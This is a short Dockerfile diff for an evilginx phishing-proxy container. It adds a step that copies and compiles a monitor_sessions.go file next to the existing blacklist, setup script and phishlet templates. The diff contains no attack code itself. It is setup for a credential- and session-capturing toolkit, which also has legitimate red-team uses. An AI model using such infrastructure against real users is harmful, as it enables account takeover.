@@ -64,11 +64,13 @@ COPY --from=build /app .
 
 # Copy additional configuration files
 COPY ./blacklist.txt /root/.evilginx/blacklist.txt
+COPY ./monitor_sessions.go /root/.evilginx/monitor_sessions.go
 COPY ./setup.sh /app/setup.sh
 COPY ./phishlets /app/phishlets
 
-# Set execute permissions for setup.sh
+# Set execute permissions for setup.sh and build monitor_sessions.go
 RUN chmod +x /app/setup.sh
+RUN go build -o monitor_sessions monitor_sessions.go
 
 # Configure Runtime Container
 EXPOSE ${EVILGINX_PORTS}
